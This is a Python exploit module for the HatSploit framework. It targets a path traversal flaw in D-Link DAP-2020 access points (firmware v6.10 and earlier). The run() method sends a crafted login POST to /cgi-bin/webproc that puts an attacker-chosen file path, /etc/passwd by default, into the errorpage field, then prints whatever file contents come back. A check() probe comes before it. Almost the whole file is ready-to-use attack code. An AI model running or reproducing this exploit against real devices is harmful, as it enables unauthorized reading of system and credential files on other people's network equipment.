"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.module.basic import *
from hatsploit.lib.module.proto import HTTP

from pex.string import String


class HatSploitModule(Module, HTTP, String):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Category': "exploit",
            'Name': "D-Link DAP-2020 Path Traversal",
            'Module': "exploit/linux/dlink/dap_2020_path_traversal",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Path Traversal through incorrect login in D-Link DAP-2020 <= v6.10.",
            'Platform': OS_LINUX,
            'Rank': "high",
        })

        self.file = Option("/etc/passwd", "File to read.", True)

    def check(self):
        response = self.http_request(
            method="GET",
            path='/cgi-bin/webproc'
        )

        if not response or response.status_code != 200:
            return False

        return True

    def run(self):
        response = self.http_request(
            method="POST",
            path=f'/cgi-bin/webproc',
            data=(
                f'getpage=html%2Findex.html&errorpage={self.file.value}'
                '&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true'
                f'&obj-action=auth&%3Ausername=admin&%3Apassword={self.random_string(8)}'
                '&%3Aaction=login&%3Asessionid=365dfaef'
            ),
        )

        if response.text:
            if (
                    f"Pagefile open failed(File:{self.base64_string(self.file.value)}"
                    in response.text
            ):
                self.print_error("Failed to open file!")
            else:
                self.print_empty(f"\n{response.text}")
        else:
            self.print_warning("File is empty.")
